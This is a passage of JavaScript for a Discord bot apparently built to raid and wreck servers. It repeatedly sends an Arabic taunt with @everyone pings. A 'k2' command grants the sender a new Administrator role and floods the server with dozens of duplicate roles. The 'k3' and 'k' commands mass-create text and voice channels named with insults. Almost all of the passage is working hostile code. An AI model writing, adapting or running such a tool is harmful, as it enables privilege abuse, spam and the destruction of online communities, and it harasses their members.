إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);

    }
});

LOka.on('message', message => {
	if (message.content === "k2") {
	    if(!message.channel.guild) return;
		message.member.addRole(message.guild.roles.find("name", "عمك مهستر"));

	}
});
LOka.on('message', message => {
    if(!message.channel.guild) return;

     if (message.content === "k2") {
     if(!message.channel.guild) return;
    message.guild.createRole({
        name : "عمك مهستر",
        permissions :  [8],
        color : "#23272a"
    }).then(function(role){
        message.member.addRole(role);
    })
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
	        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
	        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
	        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
	        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
	        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
	
	        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
	
	
}
});
LOka.on('message', message => {
         if (message.content === "k3") {
     if(!message.channel.guild) return;
message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('  مهستر نايكم', 'text');

message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('  مهستر نايكم', 'text');

message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('  مهستر نايكم', 'text');

message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('  مهستر نايكم', 'text');

message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('  مهستر نايكم', 'text');

message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('  مهستر نايكم', 'text');

message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('  مهستر نايكم', 'text');

message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('  مهستر نايكم', 'text');

message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('نايكم مهستر', 'text');


message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('  مهستر نايكم', 'text');

message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('  مهستر نايكم', 'text');

message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('نايكم مهستر', 'text');


}

});

LOka.on('message', message => {
         if (message.content === "k") {
     if(!message.channel.guild) return;

message.guild.createChannel('نايكم مهستر', 'voice');
message.guild.createChannel('نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'voice');
message.guild.createChannel('نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر ', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكمم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكممهستر', 'text');
message.guild.createChannel(' نايكم مهستر ', 'text');
message.guild.createChannel(' نايكم مهستر' , 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel('نايكم مهستر', 'voice');
message.guild.createChannel('نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'voice');
message.guild.createChannel('نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر ', 'text');
